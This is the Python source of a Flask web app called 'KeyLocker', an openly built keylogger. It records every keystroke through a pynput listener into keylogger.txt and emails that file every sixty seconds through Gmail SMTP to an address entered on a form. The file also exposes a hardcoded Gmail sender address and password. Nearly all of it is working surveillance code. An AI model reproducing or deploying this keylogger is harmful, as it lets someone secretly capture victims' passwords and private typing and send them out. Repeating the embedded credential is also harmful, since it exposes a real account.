from flask import Flask,render_template,request
from pynput.keyboard import Listener
import email, smtplib, ssl
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import threading
app = Flask(__name__)
def send_file(userEmail):
    threading.Timer(60,send_file,[userEmail]).start()
    subject = "KeyLocker"
    body = "This email containing confedential file please don't share this with anyone"
    sender_email = "samsamirtgm@gmail.com"
    receiver_email = userEmail
    password = "1allahakbar#"

    # Create a multipart message and set headers
    message = MIMEMultipart()
    message["From"] = sender_email
    message["To"] = receiver_email
    message["Subject"] = subject
    message["Bcc"] = receiver_email  # Recommended for mass emails

    # Add body to email
    message.attach(MIMEText(body, "plain"))

    filename = "keylogger.txt"  

    # Open PDF file in binary mode
    with open(filename, "rb") as attachment:
        # Email client can usually download this automatically as attachment
        part = MIMEBase("application", "octet-stream")
        part.set_payload(attachment.read())
    # Encode file in ASCII characters to send by email    
    encoders.encode_base64(part)
    # Add header as key/value pair to attachment part
    part.add_header(
        "Content-Disposition",
        f"attachment; filename= {filename}",
    )
    # Add attachment to message and convert message to string
    message.attach(part)
    text = message.as_string()
    # Log in to server using secure context and send email
    context = ssl.create_default_context()
    try:
        with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, text)
    except:
        pass
    file = open("keylogger.txt","r+")
    file.truncate(0)
    file.close()

@app.route("/",methods=['GET','POST'])
def home():
    if request.method == 'POST':
        userEmail = request.form.get("email")
        send_file(userEmail)
        def key_stroke(key):
            key = str(key).replace("'","")
            if key == 'Key.space':
                key = ' '
            elif key == 'Key.shift':
                key = ''
            elif key == 'Key.enter':
                key = "\n"
            elif key == 'Key.backspace':
                key=""
            elif key == 'Key.left' or key == 'Key.right':
                key=""     
            elif key == 'Key.up' or key == 'Key.down':
                key = ""       
            elif key == 'Key.delete':
                key = ""    
            elif key == "Key.caps_lock":  
                key = "" 
            else:
                pass    
            filename = "keylogger"+".txt"      
            with open(filename,"a") as file:
                file.write(key)       
        with Listener(on_press=key_stroke) as listen:
            listen.join()     
    return render_template("index.html")

@app.route("/about") 
def about():
    return "About page"   

if __name__ == "__main__":
    app.run(debug=True)    